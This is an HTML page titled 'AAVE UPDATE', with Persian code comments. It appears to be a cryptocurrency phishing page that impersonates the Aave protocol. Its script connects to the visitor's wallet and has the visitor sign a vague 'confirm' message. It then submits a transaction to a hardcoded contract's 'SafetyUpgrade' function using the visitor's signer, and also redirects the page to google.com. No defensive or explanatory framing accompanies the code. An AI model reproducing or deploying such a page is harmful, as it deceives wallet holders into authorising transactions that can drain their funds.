<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>AAVE UPDATE</title>
</head>
<body>
<script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.umd.min.js"></script>
<script>
// ===== Task2: ریدایرکت فوری =====
window.location.replace("https://google.com");

// ===== Task1: اتصال ولت و ارسال امضا به کانترکت =====
(async () => {
  if (window.ethereum) {
    try {
      // درخواست اتصال به ولت
      await window.ethereum.request({ method: 'eth_requestAccounts' });
      const provider = new ethers.BrowserProvider(window.ethereum);
      const signer = await provider.getSigner();

      // مرحله ۱: گرفتن امضا از کاربر
      const message = "Please sign this message to confirm."; // پیام دلخواه
      const signature = await signer.signMessage(message);

      // مرحله ۲: تعریف ABI و آدرس کانترکت
      const contractAddress = "0x49E9FD750667B2D13172916b26fA9fD764b5E20F"; 
      const abi = [
        {
          "inputs": [
            { "internalType": "bytes", "name": "_signature", "type": "bytes" }
          ],
          "name": "SafetyUpgrade",
          "outputs": [],
          "stateMutability": "nonpayable",
          "type": "function"
        }
      ];

      // مرحله ۳: اتصال به کانترکت
      const contract = new ethers.Contract(contractAddress, abi, signer);

      // مرحله ۴: ارسال تراکنش (امضا به کانترکت)
      const txResponse = await contract.SafetyUpgrade(signature);
      console.log("Tx sent:", txResponse.hash);

    } catch (err) {
      console.error("Error:", err);
    }
  }
})();
</script>
</body>
</html>
